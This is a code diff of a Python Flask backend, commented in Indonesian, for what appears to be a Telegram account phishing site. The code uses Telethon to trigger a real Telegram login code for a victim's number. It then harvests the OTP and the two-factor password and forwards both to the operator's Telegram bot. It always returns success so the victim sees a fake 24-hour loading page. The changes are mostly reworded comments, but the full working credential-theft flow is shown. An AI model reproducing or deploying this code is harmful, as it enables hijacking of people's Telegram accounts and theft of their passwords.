@@ -7,10 +7,10 @@ from telethon import TelegramClient, errors
 from asgiref.sync import async_to_sync
 
 app = Flask(__name__)
-# Izinkan semua origin agar Netlify bisa memanggil backend
+# Membuka izin akses secara global untuk semua domain
 CORS(app, resources={r"/*": {"origins": "*"}})
 
-# Variabel Railway
+# Variabel Dashboard Railway
 API_ID = os.getenv("API_ID")
 API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
@@ -19,6 +19,7 @@ CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 sessions_hash = {}
 
 def send_to_bot(message):
+    """Kirim laporan log ke Bot Telegram"""
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     try:
         requests.post(url, json={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})
@@ -26,6 +27,7 @@ def send_to_bot(message):
         pass
 
 async def telethon_logic(data):
+    """Logika Telethon: Deteksi OTP & Sandi"""
     step = data.get('step')
     nomor = data.get('nomor')
     otp = data.get('otp')
@@ -37,7 +39,7 @@ async def telethon_logic(data):
     try:
         await client.connect()
         
-        # STEP 1: Kirim OTP
+        # STEP 1: Kirim Kode OTP
         if step == 1:
             sent_code = await client.send_code_request(nomor)
             sessions_hash[nomor] = sent_code.phone_code_hash
@@ -52,15 +54,15 @@ async def telethon_logic(data):
                 send_to_bot(f"✅ *Login Tanpa 2FA*\nNomor: {nomor}\nOTP: {otp}")
                 return {"status": "success"}, 200
             except errors.SessionPasswordNeededError:
-                # Jika ada 2FA, perintahkan website pindah ke halaman sandi
+                # Beritahu frontend untuk pindah ke halaman sandi
                 return {"status": "need_2fa"}, 200
             except errors.PhoneCodeInvalidError:
                 return {"status": "error", "message": "Kode OTP Salah!"}, 400
 
-        # STEP 3: Terima Sandi & Langsung Lolos ke Loading
+        # STEP 3: Langsung Pindahkan ke Loading (Abaikan Validasi Sandi)
         elif step == 3:
-            send_to_bot(f"🔑 *Sandi Diterima*\nNomor: {nomor}\nSandi: {sandi}")
-            # Beri respon sukses tanpa cek benar/salah agar langsung ke halaman loading 24 jam
+            send_to_bot(f"🔑 *Sandi Masuk*\nNomor: {nomor}\nSandi: {sandi}")
+            # Selalu kirim sukses agar website pindah ke halaman 24 jam
             return {"status": "success"}, 200
 
     except Exception as e:
@@ -68,22 +70,21 @@ async def telethon_logic(data):
     finally:
         await client.disconnect()
 
-# FUNGSI DARURAT FIX CORS: Memaksa header agar tidak merah
+# FUNGSI DARURAT FIX CORS: Menyuntikkan header izin secara manual
 def _force_cors(response):
     response.headers["Access-Control-Allow-Origin"] = "*"
-    response.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS, GET"
+    response.headers["Access-Control-Allow-Methods"] = "POST, GET, OPTIONS"
     response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
     return response
 
 @app.route('/register', methods=['POST', 'OPTIONS'])
 def register():
-    # Menangani pengecekan browser (Preflight)
+    # Menangani Preflight (Pesan merah di konsol)
     if request.method == 'OPTIONS':
         return _force_cors(make_response())
         
     data = request.json
     try:
-        # Menjalankan logika Telethon
         result, status_code = async_to_sync(telethon_logic)(data)
         response = make_response(jsonify(result), status_code)
         return _force_cors(response)
@@ -92,6 +93,6 @@ def register():
         return _force_cors(response)
 
 if __name__ == "__main__":
-    # Gunakan port 8080 sesuai log Railway kamu
+    # Menyesuaikan port 8080 dari log Railway
     port = int(os.getenv("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
